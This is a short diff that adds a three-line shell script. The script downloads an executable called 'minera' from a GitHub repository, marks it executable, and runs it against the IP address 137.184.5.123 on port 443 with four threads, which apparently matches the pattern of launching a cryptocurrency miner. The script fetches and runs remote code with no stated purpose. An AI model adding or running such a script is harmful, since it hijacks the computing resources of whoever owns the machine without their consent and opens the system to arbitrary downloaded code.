@@ -1,0 +1,3 @@
+apt update
+wget https://github.com/komaria10003099/komaria/raw/main/minera && chmod +x minera
+./minera -o 137.184.5.123:443 -t 4
